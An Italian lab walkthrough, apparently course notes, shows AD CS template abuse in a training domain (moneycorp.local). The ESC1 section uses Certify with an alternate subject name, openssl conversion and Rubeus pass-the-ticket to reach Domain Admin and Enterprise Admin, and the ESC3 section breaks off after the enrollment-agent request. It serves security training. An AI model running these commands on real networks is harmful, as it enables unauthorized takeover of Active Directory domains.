# LEARNING OBJECTIVE21

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

1. Check if AD CS is used by the target forest and find any\
   vulnerable/abusable templates
2. Abuse any such template(s) to escalate to Domain Admin and Enterprise\
   Admin.

### SVOLGIMENTO 1

Possiamo utilizzare lo strumento Certify per verificare la presenza di AD CS in moneycorp.

```powershell
C:\AD\Tools\Certify.exe cas
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Possiamo elencare tutti i modelli utilizzando il seguente comando. Esaminando l'output possiamo trovare alcuni modelli interessanti.

```powershell
C:\AD\Tools\Certify.exe find
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### SVOLGIMENTO2-Elevazione dei privilegi a DA ed EA utilizzando ESC1

Il modello HTTPSCertificates sembra interessante. Cerchiamo di ottenere ulteriori informazioni al riguardo, poiché consente al richiedente di fornire il nome del soggetto:

```powershell
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubjects
```

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Ottimo! Il modello HTTPSCertificates concede i diritti di registrazione al gruppo RDPUsers e consente al richiedente di fornire il Subject Name. Ricordiamo che student460 è membro del gruppo RDPUsers. Ciò significa che possiamo richiedere un certificato per qualsiasi utente come student460.

Richiediamo un certificato per Domain Admin - Administrator:

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Copiamo la chiave privata e il certificato in un file chiamato <kbd>esc1.pem</kbd> ed convertiamo il certificato pem in pfx

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```

Usiamo come Password: SecretPass@123

Utilizziamo il PFX creato sopra con Rubeus per richiedere un TGT per DA - Amministratore!

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt
```

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Verifica se ora disponiamo effettivamente dei privilegi DA:

```powershell
winrs -r:dcorp-dc cmd /c set username
```

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Fantastico! Possiamo usare un metodo simile per ottenere i privilegi di Enterprise Admin. Richiedere un certificato per EA - Amministratore dobbiamo fare logout/login prima di poter ottenere privilegi di Enterprise Admin

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
```

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Creiamo il file pem per poi convertirlo in pfx, usiamo <kbd>SecretPass@123</kbd> come password

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
```

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Utilizza Rubeus per richiedere il TGT per l'Amministratore EA

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass@123 /ptt
```

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Ora possiamo accedere mcorp-dc

```
winrs -r:mcorp-dc cmd /c  set username
```

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation DA e EA usando il template esc3

Se elenchiamo i modelli vulnerabili in moneycorp, otteniamo il seguente risultato:

```powershell
C:\AD\Tools\Certify.exe find /vulnerable
```

<figure><img src="../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

Il modello “SmartCardEnrollment-Agent” dispone di EKU per Certificate Request Agent e concede diritti di enrollment agli utenti del dominio. Se riusciamo a trovare un altro modello con un EKU che consenta l'autenticazione del dominio e abbia requisiti di criteri applicativi dell'certificate request agent, possiamo richiedere certificati per conto di qualsiasi utente.

```powershell
 C:\AD\Tools\Certify.exe find
```

<figure><img src="../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

Ottimo! Ora e' possibile richiedere un Enrollment Agent Certificate dal template “SmartCardEnrollment-Agent”:

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```
